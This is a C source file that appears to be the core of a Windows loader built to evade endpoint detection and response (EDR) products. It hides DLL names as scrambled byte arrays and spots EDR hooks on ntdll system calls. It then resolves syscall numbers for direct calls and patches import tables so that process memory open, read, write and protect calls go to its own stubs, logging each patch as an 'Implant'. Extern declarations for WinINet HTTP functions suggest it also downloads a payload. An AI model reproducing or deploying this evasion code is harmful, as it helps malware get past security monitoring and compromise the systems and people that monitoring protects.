#pragma once

#include "hook.h"

#include <Windows.h>
#include <stdio.h>

static SYSCALL_LIST SyscallList;
static SYSCALL_LIST HookList;
static MODULE_LIST ModList;
static FARPROC ntdllBase;
static FARPROC kernel32Base;
static FARPROC kernelbaseBase;

extern BOOLEAN SetTableAddr(PVOID pSyscallTable);
extern BOOLEAN SetIdx(DWORD functionIndex, DWORD listIndex);
extern BOOLEAN GetData(PDWORD* dwSSN, PVOID* pSyscallRet);
extern VOID SetDebug(BOOLEAN enabled);
extern VOID SetAddr(PVOID* pAddr);
extern VOID ExecAddr(_In_ HANDLE hProcess, _In_ LPCSTR imageName, _In_ BOOLEAN force);
extern VOID SetFunctions(PVOID* pInternetOpenA, PVOID* pInternetConnectA, PVOID* pHttpOpenRequestA, PVOID* pInternetSetOptionA, PVOID* pHttpSendRequestA, PVOID* pInternetReadFile, PVOID* pNtAllocateVirtualMemory);


extern NtAllocateVirtualMemoryStub();
extern NtOpenProcessStub();
extern NtProtectVirtualMemoryStub();
extern NtReadVirtualMemoryStub();
extern NtWriteVirtualMemoryStub();
extern NtQueryVirtualMemoryStub();

extern RtlCompareStringStub();
extern RtlEqualStringStub();

static PTEB RtlGetThreadEnvironmentBlock(VOID);

EXTERN_C void PrintCall(unsigned long idx, unsigned long caller, unsigned long stack_addr)
{
    /*printf(" ==> Hook reached: Entry[%d] SSN: 0x%02X, RET: 0x%p, RSP: 0x%p, Fnc Addr: 0x%p \n",
        idx,
        SyscallList.Entries[idx].dwSsn,
        caller,
        stack_addr,
        SyscallList.Entries[idx].pAddress);*/
}

BOOL InitApi(VOID)
{

    if (!FillSyscallTable())
    {
#ifdef DEBUG
        printf("[!] Failed to fill Syscall List");
#endif
        return FALSE;
    }

    FillStatic();

    PVOID lpNameAddr = RtlAllocateHeapStub(RtlProcessHeap(), HEAP_ZERO_MEMORY, 200);

    LPCSTR names[12] = {
        (char[]) { 0x32,0x2d,0x33,0x2b,0x6c,0x2d,0x65,0x25,0x24,0x24,0x6e,0x26,0x2a,0x72,0x28,0x2e,0x65,0x40,0x21,0x6b,0x00 }, //kernel32 
        (char[]) { 0x65,0x73,0x2e,0x61,0x62,0x23,0x24,0x6c,0x65,0x28,0x2a,0x6e,0x5e,0x72,0x25,0x24,0x65,0x40,0x21,0x6b,0x00 }, //kernelbase
        (char[]) {0x32,0x33,0x72,0x24,0x23,0x65,0x29,0x2d,0x2d,0x73,0x40,0x21,0x75,0x24,0x23,0x40,0x00 },  //user32

        (char[]) { 0x68,0x23,0x6e,0x2d,0x65,0xcb,0x86,0xcb,0x86,0x61,0x24,0x73,0x40,0x72,0x21,0x00 }, //rsaenh
        (char[]) { 0x73,0x65,0x76,0x40,0x21,0x69,0x74,0x40,0x69,0x6d,0x26,0x69,0x72,0xcb,0x86,0x25,0x24,0x50,0x29,0x29,0x74,0x2d,0x70,0x79,0x23,0x72,0x63,0x3b,0x2e,0x40,0x21,0x62,0x00 }, //bcryptPrimitives
        (char[]) { 0x70,0x74,0x2a,0x28,0x74,0x28,0x26,0x68,0xcb,0x86,0x25,0x6e,0x24,0x23,0x69,0x40,0x21,0x77,0x00 }, //winhttp
        (char[]) { 0x32,0x33,0x25,0x24,0x5f,0x25,0x24,0x32,0x73,0x24,0x24,0x23,0x21,0x77,0x00 }, //WS2_32
        (char[]) { 0x74,0x65,0x29,0x23,0x23,0x23,0x23,0x23,0x23,0x40,0x6e,0x69,0xcb,0x86,0x25,0x24,0x6e,0x2b,0x2d,0x69,0x26,0xcb,0x86,0x77,0x00 }, //wininet
        (char[]) { 0x65,0x73,0x23,0x40,0x61,0x24,0x62,0x28,0x2a,0x26,0x74,0x70,0x79,0xcb,0x86,0x25,0x72,0x2a,0x28,0x29,0x63,0x00 }, //CRYPTBASE
        (char[]) { 0x73,0x6c,0x21,0x69,0x21,0x74,0x21,0x75,0x21,0x74,0x21,0x65,0x21,0x6e,0x00 }, //netutils
        (char[]) { 0x70,0x73,0x74,0x70,0x26,0x79,0x26,0xcb,0x86,0x72,0x25,0x24,0x23,0x63,0x00 }, //CRYPTSP
        (char[]) { 0x65,0x72,0x40,0x6f,0x29,0x40,0x21,0x63,0x67,0x62,0xcb,0x86,0xcb,0x86,0x25,0x24,0x64,0x00 }, //dbgcore
    };

    for (WORD ib = 0; ib < 12; ib++)
    {
        LPCSTR lName = (LPCSTR)lpNameAddr;
        memset(lpNameAddr, 0, 200);
        WORD i2 = 0;
        WORD s2 = 0;
        for (short i = 0; i < 200; i++)
        {
            char c = (char)*(((PBYTE)names[ib]) + i);
            if (c == 0x00) {
                s2 = i - 1;
                break;
            }
        }
        for (signed short i = s2; i >= 0; i--)
        {
            char c = (char)*(((PBYTE)names[ib]) + i);
            if ((c >= 0x30 && c <= 0x39) || (c >= 0x41 && c <= 0x5A) || (c >= 0x61 && c <= 0x7a) || c == 0x5f) {
                ((char)*((char*)((PBYTE)lpNameAddr + i2++))) = (char)*(((PBYTE)names[ib]) + i);
            }
        }
        ExecAddr(Local(), lName, TRUE);

        //UnhookAll((HANDLE)-1, lName, FALSE);
    }
    
    

    return TRUE;
}

PVOID CurNtdll(VOID)
{
    PTEB pCurrentTeb;
    PPEB pCurrentPeb;

    PLDR_DATA_TABLE_ENTRY pLdrDataEntry;
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;

    PIMAGE_DOS_HEADER pImageDosHeader;
    PIMAGE_NT_HEADERS pImageNtHeaders;

    PVOID pBase = NULL;
    PVOID npBase;

    pCurrentPeb = NtCurrentPeb();

    if (!pCurrentPeb || pCurrentPeb->OSMajorVersion != 0x0a)
        goto cfinal;

    pImageExportDirectory = NULL;
    pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    pBase = pLdrDataEntry->DllBase;

    pImageDosHeader = (PIMAGE_DOS_HEADER)pBase;

    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        goto cfinal;

    pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pBase + pImageDosHeader->e_lfanew);

    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        goto cfinal;

cfinal:
    if (pBase == NULL) {
        npBase = GetClearNtdll();
        if (npBase != NULL) {
            pBase = npBase;
        }
    }

    return pBase;
}

static BOOL FillSyscallTable(VOID)
{
    //Return if it already filled
    if (SyscallList.Count > 0) return TRUE;

    if (!GetBaseAddresses()) return FALSE;

    PPEB pCurrentPeb;

    PLDR_DATA_TABLE_ENTRY pLdrDataEntry;
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;

    PIMAGE_DOS_HEADER pImageDosHeader;
    PIMAGE_NT_HEADERS pImageNtHeaders;

    PVOID va;
    PVOID pBase;
    PVOID pRealBase = CurNtdll();

    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory2 = NULL;
    PIMAGE_NT_HEADERS pImageNtHeaders2 = NULL;
    PDWORD pdwFunctions2 = NULL;
    PDWORD pdwNames2 = NULL;
    PWORD pwNameOrdinals2 = NULL;

    pImageNtHeaders2 = ((PIMAGE_NT_HEADERS)((PBYTE)pRealBase + ((PIMAGE_DOS_HEADER)pRealBase)->e_lfanew));
    if (pImageNtHeaders2->Signature == IMAGE_NT_SIGNATURE && pImageNtHeaders2->OptionalHeader.DataDirectory[0].Size > 0) {
        pImageExportDirectory2 = (PBYTE)pRealBase + pImageNtHeaders2->OptionalHeader.DataDirectory[0].VirtualAddress;
        pdwFunctions2 = (PDWORD)((PBYTE)pRealBase + pImageExportDirectory2->AddressOfFunctions);
        pwNameOrdinals2 = (PWORD)((PBYTE)pRealBase + pImageExportDirectory2->AddressOfNameOrdinals);
    }


    SetTableAddr(&SyscallList.Entries);

    pBase = ntdllBase;

#ifdef DEBUG
    printf("0x%p = &SyscallList\n0x%p = &Ntdll base\n0x%p = &Ntdll real base\n", &SyscallList, pBase, pRealBase);
#endif

procdll:

    pImageDosHeader = (PIMAGE_DOS_HEADER)pBase;

    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pBase + pImageDosHeader->e_lfanew);

    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    ModList.Count = 1;
    ModList.Entries[0].pAddress = pBase;

    // Create a copy of the first 4096 bytes
    PVOID lpLocalAddress = RtlAllocateHeapStub(RtlProcessHeap(), HEAP_ZERO_MEMORY, pImageNtHeaders->OptionalHeader.DataDirectory[0].Size);
    //PVOID lpLocalAddress = VirtualAllocEx((HANDLE)-1, NULL, pImageNtHeaders->OptionalHeader.DataDirectory[0].Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!lpLocalAddress)
        return FALSE;

    va = (PVOID)((PBYTE)pBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    memcpy(lpLocalAddress, va, pImageNtHeaders->OptionalHeader.DataDirectory[0].Size);

    pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(lpLocalAddress);

#ifdef DEBUG
    printf("0x%p = pImageExportDirectory\n", pImageExportDirectory);
    printf("0x%p = lpLocalAddress\n", lpLocalAddress);
#endif

    PDWORD pdwFunctions;
    PDWORD pdwNames;
    PWORD pwNameOrdinals;

    PCHAR pcName = NULL;
    PVOID pAddress = NULL;

    pdwFunctions = RVA2OFFSET(PDWORD, pBase, lpLocalAddress, va, pImageExportDirectory->AddressOfFunctions);
    pdwNames = RVA2OFFSET(PDWORD, pBase, lpLocalAddress, va, pImageExportDirectory->AddressOfNames);
    pwNameOrdinals = RVA2OFFSET(PDWORD, pBase, lpLocalAddress, va, pImageExportDirectory->AddressOfNameOrdinals);

    PSYSCALL_INFO Entries = SyscallList.Entries;

    DWORD idx = 0;
    BOOLEAN force = FALSE;
    BOOLEAN bDiff = FALSE;

#ifdef DEBUG
    printf("[>] Hooked Ntdll Syscall List:\n");
#endif

    USHORT nameBase[2] = { 'tN', 'wZ' };
    for (WORD ib = 0; ib < sizeof(nameBase); ib++) {
        for (WORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) {

            force = FALSE;
            pcName = RVA2OFFSET(PDWORD, pBase, lpLocalAddress, va, pdwNames[i]);
            pAddress = (PBYTE)pBase + pdwFunctions[pwNameOrdinals[i]];

            if (pImageExportDirectory2 != NULL && (DWORD64)pBase != (DWORD64)pRealBase && pImageExportDirectory->NumberOfNames == pImageExportDirectory2->NumberOfNames) {
                PVOID pAddress2 = (PBYTE)pRealBase + pdwFunctions2[pwNameOrdinals2[i]];
                bDiff = ((DWORD64)pAddress != (DWORD64)pAddress2);
            }

            if (lstrcmpiA(pcName, "RtlAllocateHeap") == 0)
                pRtlAllocateHeap = (PVOID)pAddress;

            // Is this a system call?
            if ((*(USHORT*)pcName != nameBase[ib]))
                continue;

            //Skip 2 first chars to ignore Zw and Nt
            DWORD64 dwHash = djb2(((PBYTE)pcName) + 2);

            if (dwHash == 0x66C71BD1B0714D3E) // NtQuerySystemTime => False positive
                continue;

            //Our minimal 7 functions
            if ((dwHash == 0x8AD1C604A65844A5) || (dwHash == 0x7AF7191D67000DB5) || (dwHash == 0x852E6B87B62C2CF0) || (dwHash == 0x0F4CE15C0758B33F)
                || (dwHash == 0x989246E5A13FCBD9) || (dwHash == 0x8599A0E7F8A94577) || (dwHash == 0x0EDA779755029A0A))
                force = TRUE;

            //Force other critical calls
            /*
            NtQueryVirtualMemory 0x0EDA779755029A0A
            NtCreateUserProcess 0x172ECAD8537A0F66
            NtCreateThread 0xDCAA9BF058531500
            NtCreateThreadEx 0xB1C15967B96C5E5D
            ZwResumeThread 0xE6EBB45B4D604B1D
            */

            if (!force && (
                (dwHash == 0xDCAA9BF058531500) || (dwHash == 0xB1C15967B96C5E5D) || (dwHash == 0xE6EBB45B4D604B1D) || (dwHash == 0x172ECAD8537A0F66)
                ))
                force = TRUE;

            ////printf("%s 0x%p 0x%p\n", pcName, pAddress, dwHash);

            /*
                Handle hooked functions

                jmp <edr.dll>
                ; or
                mov r10, rcx
                jmp <edr.dll>
            */

            DWORD64 dwSsn = GetSSN(pAddress);
            if (dwSsn == -1)
                continue;

            PVOID pSyscallRet = GetNextSyscallInstruction(pAddress);
            if (pSyscallRet == NULL)
                continue;

            BOOLEAN dupFound = FALSE;
            for (DWORD id = 0; id < SyscallList.Count; id++)
            {
                ////printf("%d 0x%p 0x%p\n", id, (DWORD64)Entries[id].pAddress, (DWORD64)pAddress);

                if ((DWORD64)Entries[id].pAddress == (DWORD64)pAddress) dupFound = TRUE;
            }

            if (dupFound)
                continue;

            Entries[idx].pAddress = pAddress;
            Entries[idx].dwSsn = dwSsn;
            Entries[idx].pSyscallRet = pSyscallRet;
            Entries[idx].dwHash = dwHash;
            Entries[idx].bIsHooked = (BOOLEAN)(force || bDiff || (*((PBYTE)pAddress) == 0xe9 || *((PBYTE)pAddress + 3) == 0xe9));

#ifdef DEBUG
            if (Entries[idx].bIsHooked)
            {
                printf("  |--> Entries[%03lu] SSN = 0x%04X, Address = 0x%p: %s\n", idx, dwSsn, pAddress, pcName);
            }
#endif

            if (dwHash == 0x8AD1C604A65844A5)
                SetIdx(0, idx); // 0 => ZwOpenProcess 
            else if (dwHash == 0x7AF7191D67000DB5)
                SetIdx(1, idx); // 1 => ZwProtectVirtualMemory 
            else if (dwHash == 0x852E6B87B62C2CF0)
                SetIdx(2, idx); // 2 => ZwReadVirtualMemory 
            else if (dwHash == 0x0F4CE15C0758B33F)
                SetIdx(3, idx); // 3 => ZwWriteVirtualMemory 
            else if (dwHash == 0x989246E5A13FCBD9)
                SetIdx(4, idx); // 4 => ZwAllocateVirtualMemory 
            else if (dwHash == 0x8599A0E7F8A94577)
                SetIdx(5, idx); // 5 => ZwDelayExecution 
            else if (dwHash == 0x0EDA779755029A0A)
                SetIdx(6, idx); // 6 => NtQueryVirtualMemory 

            idx++;
            if (idx == MAX_ENTRIES) break;
            continue;
        }

        // Save total number of system calls found.
        SyscallList.Count = idx;

        if (idx == MAX_ENTRIES) break;
    }

    if (SyscallList.Count < 7) {

#ifdef DEBUG
        printf("  |--> Getting other Ntdll version\n");
#endif
        PVOID npBase = GetClearNtdll();
        if ((npBase != NULL) && ((DWORD64)npBase != (DWORD64)pBase)) {
            pBase = npBase;
            goto procdll;
        }
    }

#ifdef DEBUG
    printf("  +--> Mapped %lld functions\n", SyscallList.Count);
#endif

    if (SyscallList.Count > 0) {

        SetAddr(&UnhookAll);

    }

    return SyscallList.Count > 0;
}

BOOL FillStatic()
{
    /*
    GetProcAddress 0x7E5C872C2386C38E
    ReadProcessMemory 0x008A113C2D680A68
    VirtualProtect 0x9BE32131D8A4F9FC
    VirtualProtectEx 0x2130350A95CB7259
    VirtualQuery 0xE9CF8C23129C8A71
    VirtualQueryEx 0x9BE321322BE8F40E
    */

    if (HookList.Count == 0) {
        HookList.Entries[0].pStubFunction = &HGetProcAddress3;
        HookList.Entries[0].dwHash = 0x7E5C872C2386C38E;

        HookList.Entries[1].pStubFunction = &HReadProcessMemory;
        HookList.Entries[1].dwHash = 0x008A113C2D680A68;

        //HookList.Entries[2].pStubFunction = &HVirtualProtect;
        //HookList.Entries[2].dwHash = 0x9BE32131D8A4F9FC;

        HookList.Entries[3].pStubFunction = &HVirtualProtectEx;
        HookList.Entries[3].dwHash = 0x2130350A95CB7259;

        //HookList.Entries[4].pStubFunction = &HVirtualQuery;
        //HookList.Entries[4].dwHash = 0xE9CF8C23129C8A71;

        //HookList.Entries[5].pStubFunction = &HVirtualQueryEx;
        //HookList.Entries[5].dwHash = 0x9BE321322BE8F40E;

        HookList.Count = 6;
    }

    return TRUE;
}

BOOL ProcAllByAddr(_In_ LPCSTR imageBaseName, _In_ PVOID imageBase, _In_opt_ HANDLE hProcess)
{
    PIMAGE_DOS_HEADER pImageDosHeader;
    PIMAGE_NT_HEADERS pImageNtHeaders;
    PVOID va;
    PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = NULL;
    LPCSTR imageName;

    unsigned int hCount = 0;

    if (imageBaseName != NULL) {
        imageName = imageBaseName;
    }
    else {
        imageName = "in memory";
    }

    if (hProcess == NULL)
        hProcess = (HANDLE)-1;
    
    pImageDosHeader = (PIMAGE_DOS_HEADER)imageBase;

    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)imageBase + pImageDosHeader->e_lfanew);

    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // Create a copy of the first 4096 bytes
    //PVOID lpLocalAddress = VirtualAllocEx((HANDLE)-1, NULL, pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    PVOID lpLocalAddress = RtlAllocateHeapStub(RtlProcessHeap(), HEAP_ZERO_MEMORY, pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);
    if (!lpLocalAddress)
        return FALSE;

    va = (PVOID)((PBYTE)imageBase + pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    memcpy(lpLocalAddress, va, pImageNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);

    pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(lpLocalAddress);

    LPCSTR libraryName = NULL;
    HMODULE library = NULL;
    PIMAGE_IMPORT_BY_NAME functionName = NULL;

    PSYSCALL_INFO Entries = SyscallList.Entries;

    DWORD minRVA = 0xffffffff;
    DWORD maxRVA = 0;
    PIMAGE_IMPORT_DESCRIPTOR tmp1 = (PIMAGE_IMPORT_DESCRIPTOR)(va);
    while (tmp1->Name != NULL)
    {
        if (tmp1->Name > maxRVA)
            maxRVA = tmp1->Name;
        if (tmp1->Name < minRVA)
            minRVA = tmp1->Name;

        tmp1++;
    }
    maxRVA += 100; // Space for the last name

    
    //PVOID lpNames = VirtualAllocEx((HANDLE)-1, NULL, maxRVA - minRVA, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    PVOID lpNames = RtlAllocateHeapStub(RtlProcessHeap(), HEAP_ZERO_MEMORY, maxRVA - minRVA);
    if (!lpNames)
    {
#ifdef DEBUG
        printf("[!] Error getting data space for lpNames: Status = 0x%08lx\n", GetLastError());
#endif
        return FALSE;
    }

    PVOID vaNames = (PVOID)((PBYTE)imageBase + minRVA);
    memcpy(lpNames, vaNames, maxRVA - minRVA);

    // Allocate 8 Mb
    //PVOID lpThunk = VirtualAllocEx((HANDLE)-1, NULL, 1 << 23, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    PVOID lpThunk = RtlAllocateHeapStub(RtlProcessHeap(), HEAP_ZERO_MEMORY, 1 << 23);
    if (!lpThunk)
    {
#ifdef DEBUG
        printf("[!] Error getting data space for lpThunk: Status = 0x%08lx\n", GetLastError());
#endif
        return FALSE;
    }

    
    while (pImportDescriptor->Name != NULL)
    {
        libraryName = RVA2OFFSET(LPCSTR, imageBase, lpNames, vaNames, (LPCSTR)pImportDescriptor->Name);

        library = HGetModuleHandleA(libraryName, TRUE);

        if (library == NULL) {
#ifdef DEBUG
            printf("[!] Error getting lib: Status = 0x%08lx\n", GetLastError());
#endif
        }

        if (library)
        {
            minRVA = 0xffffffff;
            maxRVA = 0;
            PIMAGE_THUNK_DATA tmp2 = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + pImportDescriptor->OriginalFirstThunk);
            PIMAGE_THUNK_DATA tmp3 = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + pImportDescriptor->FirstThunk);
            while (tmp2->u1.AddressOfData != NULL)
            {
                if (tmp2->u1.AddressOfData > maxRVA)
                    maxRVA = tmp2->u1.AddressOfData;
                if (tmp2->u1.AddressOfData < minRVA)
                    minRVA = tmp2->u1.AddressOfData;

                DWORD c1 = (DWORD_PTR)tmp2 - (DWORD_PTR)imageBase;
                if (c1 > maxRVA)
                    maxRVA = c1;
                if (c1 < minRVA)
                    minRVA = c1;

                c1 = (DWORD_PTR)tmp3 - (DWORD_PTR)imageBase;
                if (c1 > maxRVA)
                    maxRVA = c1;
                if (c1 < minRVA)
                    minRVA = c1;

                ++tmp2;
                ++tmp3;
            }
            maxRVA += 100; // Space for the last name

            if ((maxRVA - minRVA) <= (1 << 23))
            {
                PVOID vaFuncs = (PVOID)((PBYTE)imageBase + minRVA);
                memcpy(lpThunk, vaFuncs, maxRVA - minRVA);

                PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;

                originalFirstThunk = RVA2OFFSET(PIMAGE_THUNK_DATA, imageBase, lpThunk, vaFuncs, pImportDescriptor->OriginalFirstThunk);
                firstThunk = RVA2OFFSET(PIMAGE_THUNK_DATA, imageBase, lpThunk, vaFuncs, pImportDescriptor->FirstThunk);

                while ((originalFirstThunk->u1.AddressOfData != NULL) && ((originalFirstThunk->u1.AddressOfData & 0xffffffffffff) >= 0x1000))
                {
                    functionName = RVA2OFFSET(PIMAGE_IMPORT_BY_NAME, imageBase, lpThunk, vaFuncs, originalFirstThunk->u1.AddressOfData);

                    PBYTE pcName = ((PBYTE)&functionName->Name);

                    PVOID fncAddr = NULL;
                    DWORD ssn = -1;
                    if ((DWORD64)library == (DWORD64)ntdllBase)
                    {
                        DWORD64 dwHash = djb2(((PBYTE)pcName) + 2);

                        //printf("\n%s 0x%p, 0x%016llx\n", functionName->Name, firstThunk->u1.Function, dwHash);

                        for (DWORD i = 0; i < SyscallList.Count; i++)
                        {
                            //printf("%s 0x%p,  0x%p,  0x%p\n", functionName->Name, firstThunk->u1.Function, (DWORD64)Entries[i].pAddress, (DWORD64)firstThunk->u1.Function);

                            if ((DWORD64)Entries[i].pAddress == (DWORD64)firstThunk->u1.Function)
                            {
                                if (Entries[i].bIsHooked) {
                                    fncAddr = Entries[i].pStubFunction;
                                    ssn = Entries[i].dwSsn;
                                    //printf("%s 0x%p 0x%016llx 0x%016llx\n", functionName->Name, fncAddr, dwHash, Entries[i].dwHash);
                                }
                                break;
                            }
                            else if (dwHash == Entries[i].dwHash)
                            {
                                //printf("%s 0x%p,  0x%p,  0x%p 0x%016llx\n", functionName->Name, firstThunk->u1.Function, (DWORD64)Entries[i].pAddress, fncAddr, dwHash);
                                fncAddr = Entries[i].pStubFunction;
                                ssn = Entries[i].dwSsn;
                                break;
                            }
                        }
                    }

                    if ((fncAddr == NULL) && ((DWORD64)library != (DWORD64)ntdllBase))
                    {
                        DWORD64 dwHash = djb2(((PBYTE)pcName));
                        for (DWORD i = 0; i < HookList.Count; i++)
                        {
                            if (dwHash == HookList.Entries[i].dwHash)
                            {
                                fncAddr = HookList.Entries[i].pStubFunction;
                                break;
                            }
                        }
                    }

                    if (fncAddr != NULL)
                    {
                        //printf("%s 0x%p\n", functionName->Name, fncAddr);

                        SIZE_T bytesWritten = 0;
                        DWORD oldProtect = 0;
                        PVOID lpAddress;
                        PVOID fncAddress;
                        SIZE_T sDataSize = 8;

                        PIMAGE_THUNK_DATA pRealThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + OFFSET2RVA(imageBase, lpThunk, vaFuncs, firstThunk));

                        lpAddress = fncAddress = (LPVOID)(&pRealThunk->u1.Function);

                        HANDLE hProc = (HANDLE)-1;
                        if (hProcess != (HANDLE)-1)
                            hProc = hProcess;

                        if (NtProtectVirtualMemory(hProc, &lpAddress, &sDataSize, PAGE_READWRITE, &oldProtect) == 0)
                        {
                            pRealThunk->u1.Function = (DWORD_PTR)fncAddr;
                            hCount++;
#ifdef DEBUG
                            if (ssn != -1)
                                printf("  |--> Implant %s %s->%s 0x%p SSN 0x%02X\n", imageName, libraryName, functionName->Name, pRealThunk->u1.Function, ssn);
                            else
                                printf("  |--> Implant %s %s->%s 0x%p\n", imageName, libraryName, functionName->Name, pRealThunk->u1.Function);
#endif
                        }
                    }

                    ++originalFirstThunk;
                    ++firstThunk;
                }
            }
        }

        pImportDescriptor++;
    }
#ifdef DEBUG
    printf("  +--> Hooked %d function(s)\n", hCount);
#endif
}

BOOL UnhookAll(_In_ HANDLE hProcess, _In_ LPCSTR imageName, _In_ BOOLEAN force)
{

    LPVOID imageBase = HGetModuleHandleA(imageName, force);
    if ((force && (imageBase == NULL)) || ((imageBase == NULL) && (hProcess != (HANDLE)-1)))
        imageBase = HGetModuleHandleA(imageName, TRUE);
#ifdef DEBUG
    printf("\n[>] IAT Hook of: %s => 0x%p\n", imageName, imageBase);
#endif
    if (imageBase == NULL)
    {

#ifdef DEBUG

        DWORD le = GetLastError();
        if (le == 126) {
            printf("[-] UnhookAll(%s): %s\n", imageName, "Module handle not found!");
        }
        else {
            printf("[-] UnhookAll(%s): %u\n", imageName, GetLastError());
        }
#endif
        return FALSE;
    }

    return ProcAllByAddr(imageName, imageBase, hProcess);
    //return ExecAddr2(imageName, imageBase, hProcess);
}

FARPROC HGetModuleHandleA(LPCSTR imageName, _In_ BOOLEAN forceLoad)
{

    DWORD64 dwHash = djb2(((PBYTE)imageName) + 2);
    PMODULE_INFO Entries = ModList.Entries;

    for (DWORD i = 0; i < ModList.Count; i++)
    {
        if (dwHash == Entries[i].dwHash)
            return (FARPROC)Entries[i].pAddress;
    }

    LPVOID imageBase = GetModuleHandleA(imageName);
    if (forceLoad && (imageBase == NULL))
        imageBase = LoadLibraryA(imageName);

    if (imageBase == NULL)
        return NULL;

    Entries[ModList.Count].pAddress = imageBase;
    Entries[ModList.Count].dwHash = dwHash;

    ModList.Count++;

    return imageBase;
}

FARPROC HGetProcAddress2(LPCSTR imageName, LPCSTR procName)
{
    LPVOID imageBase = HGetModuleHandleA(imageName, TRUE);

    return HGetProcAddress(imageBase, procName, 0);
}

FARPROC HGetProcAddress3(FARPROC imageBase, LPCSTR procName)
{
    //FARPROC addr = HGetProcAddress(imageBase, procName, 0x00);
    //printf("GetProcAddress 0x%p %s -> 0x%p\n", imageBase, procName, addr);
    //return addr;
    return HGetProcAddress(imageBase, procName, 0x00);
}

FARPROC HGetProcAddress(FARPROC imageBase, LPCSTR procName, _In_opt_ DWORD64 procHash)
{
    PPEB pCurrentPeb;

    PLDR_DATA_TABLE_ENTRY pLdrDataEntry;
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;

    PIMAGE_DOS_HEADER pImageDosHeader;
    PIMAGE_NT_HEADERS pImageNtHeaders;

    PVOID va;

    pImageDosHeader = (PIMAGE_DOS_HEADER)imageBase;

    if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)imageBase + pImageDosHeader->e_lfanew);

    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    //Check if is a hooked/mapped function
    if ((SyscallList.Count > 0) && ((DWORD64)ntdllBase == (DWORD64)imageBase)) {

        PSYSCALL_INFO Entries = SyscallList.Entries;

        DWORD64 dwHash = 0;
        if (procName != NULL) dwHash = djb2(((PBYTE)procName) + 2);

        for (DWORD i = 0; i < SyscallList.Count; i++)
        {
            if ((procHash > 0) && (procHash == Entries[i].dwHash))
                return Entries[i].pStubFunction;

            if ((procName != NULL) && (dwHash == Entries[i].dwHash))
                return Entries[i].pStubFunction;
        }
    }

    //Check if is a hooked/mapped function
    if ((HookList.Count > 0) && (procName != NULL)) {

        PSYSCALL_INFO Entries = HookList.Entries;

        DWORD64 dwHash = djb2(((PBYTE)procName));

        for (DWORD i = 0; i < HookList.Count; i++)
        {
            if (dwHash == Entries[i].dwHash)
                return Entries[i].pStubFunction;
        }
    }
    
    // Create a copy of the first 4096 bytes
    PVOID lpLocalAddress = RtlAllocateHeapStub(RtlProcessHeap(), HEAP_ZERO_MEMORY, pImageNtHeaders->OptionalHeader.DataDirectory[0].Size);
    if (!lpLocalAddress)
        return NULL;

    va = (PVOID)((PBYTE)imageBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
    memcpy(lpLocalAddress, va, pImageNtHeaders->OptionalHeader.DataDirectory[0].Size);

    pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(lpLocalAddress);

    PDWORD pdwFunctions = RVA2OFFSET(PDWORD, imageBase, lpLocalAddress, va, pImageExportDirectory->AddressOfFunctions);
    PDWORD pdwNames = RVA2OFFSET(PDWORD, imageBase, lpLocalAddress, va, pImageExportDirectory->AddressOfNames);
    PWORD pwNameOrdinals = RVA2OFFSET(PDWORD, imageBase, lpLocalAddress, va, pImageExportDirectory->AddressOfNameOrdinals);

    LPCSTR pcName = NULL;
    PVOID pAddress = NULL;

    //LPCSTR

    for (WORD i = 0; i < pImageExportDirectory->NumberOfNames; i++) {
        pcName = RVA2OFFSET(LPCSTR, imageBase, lpLocalAddress, va, pdwNames[i]);
        pAddress = (PBYTE)imageBase + pdwFunctions[pwNameOrdinals[i]];
        
        if (procHash > 0) {
            DWORD64 dwHash = djb2(((PBYTE)pcName) + 2);
            if (dwHash == procHash)
                return (PVOID)pAddress;
        }

        if ((procName != NULL) && (lstrcmpiA(pcName, procName) == 0))
            return (PVOID)pAddress;
        
    }

    return NULL;
}

static PVOID GetNextSyscallInstruction(_In_ PVOID pStartAddr)
{
    for (DWORD i = 0, j = 1; i <= 512; i++, j++) {
        if (*((PBYTE)pStartAddr + i) == 0x0f && *((PBYTE)pStartAddr + j) == 0x05) {
            return (PVOID)((ULONG_PTR)pStartAddr + i);
        }
    }

    return NULL;
}

